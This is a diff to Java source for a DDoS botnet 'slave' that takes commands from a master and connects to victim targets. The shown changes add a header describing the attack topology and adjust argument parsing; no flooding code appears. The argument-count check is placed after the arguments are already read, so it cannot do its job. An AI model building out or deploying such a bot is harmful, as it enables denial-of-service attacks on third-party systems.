@@ -1,3 +1,16 @@
+/* Slave for ddos.
+ *
+ * Aruthor : Sitao Mei
+ *
+ * The ddos topolog was as below:
+ * Master -   Slave  -  Target
+ *          \        \   ...
+ *           \        \ Traget
+ *            \ Slave - -
+ *  Desc :
+ *  This is slave ,receive user commands from master to connect or dis-connect to Targets (victims) via commands.
+ */
+
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
@@ -5,13 +18,13 @@ import java.util.*;
 import java.net.*;
 import java.text.*;
 
-
 public class SlaveBot {
 
     BufferedReader reader;
     /* master attributes
+     * belonging master's hostname and port.
      */
-    static String host_m = "MasterBot" ;
+    static String host_m ="MasterBot" ;
     static int srcPort_m = 0;
 
     /* main
@@ -24,6 +37,10 @@ public class SlaveBot {
         //Receive "-p" option for master port.
         String iparam_0 = args[0] ;
         String iparam_1 = args[2] ;
+        if ( args.length != 4 ) {
+            System.out.println("Ilegal Parameter set; You should input format: SlaveBot -h <ip|hostname> -p <srcPort>");
+            System.exit(1);
+        }
         if ( !iparam_0.equalsIgnoreCase("-h") ){
             System.out.println("Invalid Parameter : " + iparam_0 + " ; You should input format: SlaveBot -h <ip|hostname> -p <srcPort>");
             System.exit(1);
@@ -33,7 +50,7 @@ public class SlaveBot {
             System.exit(1);
         }
 
-        //Pick up parameters
+        //Retrieve parameters from command's parameters
         try {
             host_m = args[1];
             srcPort_m = Integer.parseInt(args[3]);
